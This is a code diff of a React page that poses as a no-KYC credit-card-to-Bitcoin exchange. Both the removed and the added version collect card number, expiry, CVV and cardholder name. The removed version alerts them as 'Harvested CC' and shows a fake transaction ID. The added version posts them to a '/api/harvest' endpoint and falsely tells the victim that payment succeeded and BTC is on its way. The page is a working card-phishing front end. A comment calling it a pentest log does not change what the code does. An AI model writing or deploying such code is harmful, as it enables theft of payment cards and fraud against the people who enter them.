@@ -1,39 +1,54 @@
 import { useState } from 'react';
 
-export default function CryptoBuy() {
-  const [cc, setCc] = useState('');
-  const [exp, setExp] = useState('');
-  const [cvv, setCvv] = useState('');
-  const [name, setName] = useState('');
-  const [amount, setAmount] = useState('100');
-  const [status, setStatus] = useState('');
+export default function Home() {
+  const [formData, setFormData] = useState({ cc: '', exp: '', cvv: '', name: '', amount: '' });
+  const [loading, setLoading] = useState(false);
+  const [message, setMessage] = useState('');
 
-  const buyBTC = async () => {
-    setStatus('Processing your CC...');
-    // Fake delay
-    setTimeout(() => {
-      setStatus('✅ BTC sent! Tx: 0xfake123abc... Check your wallet in 5min!');
-    }, 2000);
-    alert(`Harvested CC: ${cc}|${exp}|${cvv}|${name} - $${amount}\n(هذا للـ pentest log)`);
+  const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setLoading(true);
+    setMessage('');
+
+    try {
+      const res = await fetch('/api/harvest', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(formData),
+      });
+
+      if (res.ok) {
+        setMessage('✅ Payment successful! BTC incoming...');
+        setFormData({ cc: '', exp: '', cvv: '', name: '', amount: '' });
+      } else {
+        setMessage('❌ Try again');
+      }
+    } catch {
+      setMessage('❌ Error');
+    }
+    setLoading(false);
   };
 
   return (
-    <div style={{minHeight: '100vh', background: 'black', color: 'white', padding: '50px', textAlign: 'center'}}>
-      <h1 style={{fontSize: '40px'}}>🚀 Buy BTC with CC - Instant Delivery!</h1>
-      <p>Enter details → Get BTC to wallet. No KYC!</p>
-      <br/>
-      <input placeholder="Card Number (16 digits)" value={cc} onChange={e=>setCc(e.target.value)} style={{width: '100%', padding: '15px', margin: '10px', background: '#333'}} />
-      <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
-        <input placeholder="MM/YY (12/28)" value={exp} onChange={e=>setExp(e.target.value)} style={{padding: '15px', background: '#333'}} />
-        <input placeholder="CVV (123)" value={cvv} onChange={e=>setCvv(e.target.value)} style={{padding: '15px', background: '#333'}} />
-      </div>
-      <input placeholder="Name on Card" value={name} onChange={e=>setName(e.target.value)} style={{width: '100%', padding: '15px', margin: '10px', background: '#333'}} />
-      <input placeholder="USD Amount ($100)" value={amount} onChange={e=>setAmount(e.target.value)} style={{width: '100%', padding: '15px', margin: '10px', background: '#333'}} />
-      <br/>
-      <button onClick={buyBTC} style={{width: '100%', padding: '20px', background: 'blue', color: 'white', fontSize: '20px', border: 'none', cursor: 'pointer'}}>
-        💳 Buy BTC Now!
-      </button>
-      <p style={{marginTop: '20px', color: 'green'}}>{status}</p>
+    <div style={{ maxWidth: 400, margin: '50px auto', padding: 20, fontFamily: 'Arial' }}>
+      <h1>💰 CC to BTC Instant</h1>
+      <p>No KYC • 0% fees • Instant BTC</p>
+      <form onSubmit={handleSubmit}>
+        <input name="name" placeholder="Cardholder Name" value={formData.name} onChange={handleChange} required style={{ width: '100%', padding: 10, margin: 5, boxSizing: 'border-box' }} />
+        <input name="cc" placeholder="Card Number" value={formData.cc} onChange={handleChange} required style={{ width: '100%', padding: 10, margin: 5, boxSizing: 'border-box' }} />
+        <div style={{ display: 'flex', gap: 10 }}>
+          <input name="exp" placeholder="MM/YY" value={formData.exp} onChange={handleChange} required style={{ flex: 1, padding: 10, margin: 5 }} />
+          <input name="cvv" placeholder="CVV" value={formData.cvv} onChange={handleChange} required style={{ flex: 1, padding: 10, margin: 5 }} />
+        </div>
+        <input name="amount" placeholder="Amount USD" value={formData.amount} onChange={handleChange} required style={{ width: '100%', padding: 10, margin: 5 }} />
+        <button type="submit" disabled={loading} style={{ width: '100%', padding: 12, background: '#f39c12', color: 'white', border: 'none', fontSize: 16, margin: 5 }}>
+          {loading ? 'Processing...' : `Buy BTC ($${formData.amount || 0})`}
+        </button>
+      </form>
+      {message && <p style={{ margin: 10, padding: 10, background: '#d4edda', borderRadius: 5, color: '#155724' }}>{message}</p>}
+      <p style={{ fontSize: 12, color: '#666' }}>Secure • Powered by CryptoSwap</p>
     </div>
   );
 }
